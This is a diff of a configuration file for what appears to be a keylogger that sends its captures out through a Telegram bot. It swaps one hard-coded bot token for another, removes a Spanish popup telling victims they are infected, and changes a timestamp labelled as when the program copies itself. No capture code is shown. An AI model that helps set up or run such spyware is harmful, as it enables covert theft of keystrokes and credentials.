@@ -10,7 +10,7 @@ that will vary between devices. Change as you please.
 To initialize the bot follow these steps:
 https://blog.devgenius.io/how-to-set-up-your-telegram-bot-using-botfather-fd1896d68c02
 '''
-TOKEN = "5782793062:AAHOcicDzI7ZWAN9xSddhL9gf1N3FJeEH6U"
+TOKEN = "5782793062:AAFIFmeNfS-0z7cw4KmrAs4EBqShWddN2zE"
 
 # Setting up pytelegrambotapi to work with your telegram account
 '''
@@ -20,9 +20,6 @@ TBot.py. This function lets the bot listen for any messages like
 your chat ID in the path specified below()
 '''
 ChatIDPath = "C:/Users/angel/Desktop/KeyLogger/IDS/ChatID.txt"  # "/ChatID.txt"
-
-# popup message for intro
-tbmsg = "Usted ha sido infectado por un Keylogger desarrollado por AttackShack"
 
 # Writing to documents
 '''
@@ -37,4 +34,4 @@ logFuncMode = "w"
 
 # DateTime to copy itself
 
-dt = "2023-01-12 17:21:00000000000000000000000000000000000000000000000000000000000000000,3500"
+dt = "2023-01-18 07:21:00,3500"
